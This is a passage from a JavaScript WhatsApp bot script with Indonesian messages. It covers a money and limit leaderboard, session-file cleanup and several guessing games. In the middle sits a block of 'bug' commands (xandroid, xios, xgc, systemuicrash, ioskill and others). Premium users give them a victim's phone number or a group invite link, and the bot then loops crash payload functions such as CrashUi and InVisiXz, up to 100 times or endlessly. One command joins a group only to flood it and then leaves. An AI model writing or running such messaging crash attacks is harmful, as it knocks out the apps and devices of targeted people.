                        "buttonParamsJson": `{\"display_text\":\"Payment QRIS\",\"url\":\https://tmpfiles.org/dl/18376782/1735084730914.jpg\",\"merchant_url\":\"https://www.google.com\"}`
                      },
                    ],
                  },
                },
              ],
              messageVersion: 1,
            },
          },
        },
      },
    },
    { quoted: m }
  );

  await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break;

//=========================================\\
case 'toplimit': {
  if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
  if (!m.isGroup) return reply(mess.only.group)

  const fs = require('fs')
  const path = './database/limit.json' // Pastikan path ini benar

  // Baca database limit dari file
  let limitData
  try {
    limitData = JSON.parse(fs.readFileSync(path))
  } catch (e) {
    return reply('❌ Gagal membaca database limit.')
  }

  let users = Object.entries(limitData)
    .filter(([_, user]) => typeof user.limit === 'number')
    .sort((a, b) => b[1].limit - a[1].limit)
    .slice(0, 10)

  let teks = `🎯 *TOP 10 PENGGUNA TERBANYAK LIMIT*\n\n`
  for (let i = 0; i < users.length; i++) {
    let [jid, user] = users[i]
    let name = user.name || TradzSigma.getName?.(jid) || 'undefined'
    let phone = jid.split('@')[0]
    let mention = user.name ? `${name}` : `+${phone}`
    teks += `${i + 1}. ${mention} - ${user.limit} limit\n`
  }

  reply(teks)
}
break
case 'cekmoney': {
    if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    try {
        const target = m.mentionedJid?.[0] || m.quoted?.sender || m.sender;
        const id = typeof target === 'string' && target.includes('@') ? target : m.sender;
        const moneyDb = loadMoneyDb();
        const money = moneyDb[id]?.money || 0;

        const username = id.split('@')[0];
        const formatted = formatMoneyShort(money);

        await TradzSigma.sendMessage(m.chat, {
            text: `💰 Saldo @${username}: ${formatted}`,
            mentions: [id]
        }, { quoted: qloc });
    } catch (e) {
        console.error(e);
        reply('❌ Gagal mengecek saldo.');
    }
}
break;
case 'topmoney': {
    if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    try {
        const moneyDb = loadMoneyDb();
        const sorted = Object.entries(moneyDb)
            .filter(([jid]) => jid.endsWith('@s.whatsapp.net'))
            .sort((a, b) => (b[1]?.money || 0) - (a[1]?.money || 0))
            .slice(0, 5);

        if (sorted.length === 0) return reply('❌ Belum ada data saldo.');

        let teks = `🏆 *Top 5 Saldo Tertinggi:*\n\n`;
        let mentions = [];

        sorted.forEach(([jid, data], i) => {
            const username = jid.split('@')[0];
            const formatted = formatMoneyShort(data.money);
            teks += `${i + 1}. @${username} - ${formatted}\n`;
            mentions.push(jid);
        });

        await TradzSigma.sendMessage(m.chat, {
            text: teks,
            mentions
        }, { quoted: qloc });
    } catch (e) {
        console.error(e);
        reply('❌ Gagal menampilkan top saldo.');
    }
}
break;

case 'kurangmoney': {
    if (!TradID) return reply(mess.only.owner);

    let targetRaw = m.mentionedJid?.[0] || m.quoted?.sender || text.split(' ')[0];
    let amount = parseInt(text.split(' ')[1]);

    if (!targetRaw || isNaN(amount)) return reply('Contoh: .kurangmoney @user 1000');
    
    const number = String(targetRaw).replace(/\D/g, '');
    const id = number + '@s.whatsapp.net';

    let moneyDb = loadMoneyDb();

    if (!moneyDb[id]) moneyDb[id] = { money: 0 };
    if (typeof moneyDb[id].money !== 'number') moneyDb[id].money = 0;

    moneyDb[id].money -= amount;
    if (moneyDb[id].money < 0) moneyDb[id].money = 0;

    saveMoneyDb(moneyDb);

    reply(`✅ Berhasil mengurangi saldo Rp ${amount.toLocaleString()} dari @${number}`, null, {
        mentions: [id]
    });
}
break;
case 'mymoney': {
if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
    const fs = require('fs');
    const moneyDbPath = './database/rpgmoney.json';

    // Load database
    let moneyDb = {};
    if (fs.existsSync(moneyDbPath)) {
        try {
            moneyDb = JSON.parse(fs.readFileSync(moneyDbPath));
        } catch (err) {
            console.error('❌ Gagal parsing database:', err);
            return reply('❌ Gagal membaca database saldo.');
        }
    }

    const id = m.sender;
    const money = moneyDb[id]?.money || 0;

    reply(`💰 Saldo kamu saat ini: ${formatMoneyShort(money)}`);
}
break;

case 'addmoney': {
    const fs = require('fs');
    const dbPath = './database/rpgmoney.json';

    if (!TradID) return reply(mess.only.owner);

    // Ambil target JID dan amount
    let targetRaw = m.mentionedJid?.[0] || m.quoted?.sender || text.split(' ')[0];
    let amount = parseInt(text.split(' ')[1]);

    if (!targetRaw || isNaN(amount)) {
        return reply('Format salah!\nContoh: .addmoney @user 1000 atau .addmoney 628xxxxxx 1000');
    }

    // Pastikan targetRaw diubah ke string JID yang valid
    const number = String(targetRaw).replace(/\D/g, '');
    const id = number + '@s.whatsapp.net';

    // Load database
    let moneyDb = {};
    if (fs.existsSync(dbPath)) {
        try {
            moneyDb = JSON.parse(fs.readFileSync(dbPath));
        } catch (err) {
            console.error('❌ Gagal parsing database:', err);
            return reply('❌ Gagal membaca database saldo.');
        }
    }

    // Inisialisasi jika belum ada
    if (!moneyDb[id]) moneyDb[id] = { money: 0 };
    if (typeof moneyDb[id].money !== 'number') moneyDb[id].money = 0;

    // Tambah saldo
    moneyDb[id].money += amount;

    // Simpan database
    try {
        fs.writeFileSync(dbPath, JSON.stringify(moneyDb, null, 2));
        await TradzSigma.sendMessage(m.chat, {
            text: `✅ Berhasil menambahkan saldo Rp ${amount.toLocaleString()} ke @${number}`,
            mentions: [id]
        }, { quoted: m });
    } catch (err) {
        console.error('❌ Error simpan:', err);
        reply('❌ Terjadi kesalahan saat menyimpan saldo.');
    }
}
break;
case 'resetmoney': {
    const fs = require('fs');
    const moneyDbPath = './database/rpgmoney.json';

    if (!m.isGroup) return reply(mess.only.group)
    if (!TradID) return reply(mess.only.owner)

    // Load database
    let moneyDb = {};
    if (fs.existsSync(moneyDbPath)) {
        try {
            moneyDb = JSON.parse(fs.readFileSync(moneyDbPath));
        } catch (err) {
            console.error('❌ Gagal parsing database:', err);
            return reply('❌ Gagal membaca database saldo.');
        }
    }

    // Reset semua saldo
    let count = 0;
    for (let id in moneyDb) {
        if (typeof moneyDb[id].money === 'number') {
            moneyDb[id].money = 0;
            count++;
        }
    }

    // Simpan kembali ke file
    try {
        fs.writeFileSync(moneyDbPath, JSON.stringify(moneyDb, null, 2));
        reply(`✅ Berhasil mereset saldo *${count}* pengguna di database.`);
    } catch (err) {
        console.error('❌ Gagal menyimpan database:', err);
        reply('❌ Gagal menyimpan database saldo.');
    }
}
break;
//=========================================\\
case 'delsesi': 
  case 'clearsession': {
fs.readdir("./session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return replyviex('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file kenangan <3\n\n`
if(filteredArray.length == 0) return replyviex(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
replyviex(`${teks}`) 
await sleep(2000)
replyviex("Menghapus file Kenangan...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
replyviex("Berhasil menghapus semua Kenangan di folder session")     
});
}
break
//======================================================================
case 'amountbug': {
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break
//======================================================================
//bug cases
case 'xandroid': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'xios': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'xios2':
  {
	if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
  }
  break;
  case 'xandroid2':
  {
	if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
  }
  break;
  case 'xgc':
  {
    if (!isPrem) return replyprem(mess.premium)
    if (!text) {
      return replyviex("*CARA KIRIM BUG KE GRUB*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ Jika Anda ingin mengirimkan bug dalam jumlah banyak, silakan ketik seperti berikut\n\nEx: ." + command + " linkgc jumlah\n\nContoh:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    replyviex("mohon tunggu, "+command+" bug sedang dalam proses..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return replyviex("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await TradzSigma.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      replyviex("*DONEâœ… BUG TELAH DIKIRIM KE GRUP!.*");
      TradzSigma.groupLeave(groupTarget);
    } catch (error) {
      replyviex(util.format(error));
    }
  } 
  break;
  case 'dinzyoimiyacrush': {
  if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah) 
}
reply("sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴅɪɴɢ ʙᴜɢ ᴛᴏ ᴛᴀʀɢᴇᴛ")
}
break;
  case 'systemuicrash': {
  if (!isPrem) return reply(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'tradzsigma': {
  if (!isPrem) return reply(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 30; i++) {
await Combox(target)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'xsysui': {
  if (!isPrem) return reply(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 100; i++) {
await Combox2(target)
await Combox3(target)
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
}
break;
case 'ioskill': case 'iosx': {
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`gunakan dengan cara .${command} 916909137213`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return reply(`Contoh : .${command} 916909137213`)
await reply(`In process....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝗽𝗿𝗼𝘀𝗲𝘀 𝗯𝘂𝗴 𝗮𝗯𝗮𝗻𝗴𝗸𝘂🐉")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(from, jumlah) 
await Combox2(from, jumlah) 
await Combox3(from, jumlah) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
  
}
break
//================================================================
case 'tebakgambar': {
  if (!m.isGroup) return reply(mess.only.group)
let timeout = 60000
let id = m.chat
if (id in TradzSigma.tebakkata) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img: result.img,
      jawaban: result.jawaban,
      deskripsi: result.deskripsi
    }}
  let tos = await tebakgambar ()
  console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${tos.deskripsi}\nWaktu : 60s\nHadiah : 10.000 money`
 TradzSigma.tebakgambar[id] = [
    await TradzSigma.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: m}),
    tos,
 setTimeout(() => {
	if (TradzSigma.tebakgambar[id])
 replyviex(`Waktu Habis\nJawaban:  ${tos.jawaban}\n\nIngin bermain? Ketik tebakgambar`)
 delete TradzSigma.tebakgambar[id]
 }, 60000)
	 ]
}
break
//==================================================================
case 'tebaklagu': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await JSON.parse(fs.readFileSync('./lib/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await TradzSigma.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 TradzSigma.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 TradzSigma.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
}
break
case 'tebakkata': {
if (!m.isGroup) return reply(mess.only.group)
  let timeout = 60000
  let id = m.chat
	if (id in TradzSigma.tebakkata) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let caption = `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${json.soal}\nWaktu : 60s\nHadiah : 10.000 money`
 TradzSigma.tebakkata[id] = [
	await replyviex(`${caption}`),
	json,
 setTimeout(() => {
 if (TradzSigma.tebakkata[id]) 
 console.log("Jawaban: " + json.jawaban)
 replyviex(`Waktu Habis\nJawaban:  ${json.jawaban}\n\nIngin bermain? Ketik tebakkata`) 
 delete TradzSigma.tebakkata[id]
 }, 60000)
 ]
}
break
//==================================================================
case 'tebakkalimat': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 TradzSigma.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 TradzSigma.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'tebaklirik':{
  if (!m.isGroup) return reply(mess.only.group)
let users = global.db.users[m.sender]
	let timeout = 60000
	let poin = 10000
	let id = m.chat
	if (id in TradzSigma.tebaklirik) return replyviex('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Bonus: ${poin} XP
	Hadiah: ${poin} Money
	`.trim()
	TradzSigma.tebaklirik[id] = [
	await replyviex(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (TradzSigma.tebaklirik[id]) 
users.money -= 200
replyviex(`*GAME TEBAK LIRIK*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete TradzSigma.tebaklirik[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'caklontong': {
  if (!m.isGroup) return reply(mess.only.group)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 TradzSigma.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 TradzSigma.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'family100': {
  if (!m.isGroup) return reply(mess.only.group)
  let winScore = 10000
 let id = m.chat
	if (id in TradzSigma.family100) return replyviex('Masih Ada Sesi Yang Belum Diselesaikan!')
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n\nSoal : ${json.soal}\n\nHadiah : 10.000 money\n\nTerdapat *${json.jawaban.length}* Jawaban ${json.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 TradzSigma.family100[id] = {
			id,
			msg: await replyviex(`${hasil}`),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
      winScore,  
        }
}
break
//==================================================================
case 'upvn':{
if (!TradID) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
function getRandomHexColor() {
  return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
}
const media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
TradzSigma.sendMessage('status@broadcast', {audio: { url: media }, mimetype: 'audio/mp3', ptt:true },{
backgroundColor: getRandomHexColor(),
statusJidList: Object.keys(db.users)
});
}
reply(`*Sukses mengirim status whatsapp ke  Orang Yang Ada Di database*`)
break
//==================================================================
case 'tebaktebakan': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
TradzSigma.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
    tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    TradzSigma.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
    delete tebaktebakan[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'tebakbendera': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
TradzSigma.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    TradzSigma.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakbenderav2': {
  if (!m.isGroup) return reply(mess.only.group)
 if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
TradzSigma.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    TradzSigma.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkabupaten': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return replyviex("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
let result = anu[Math.floor(Math.random() * anu.length)]
TradzSigma.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
    tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
})
await sleep(60000)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.title)
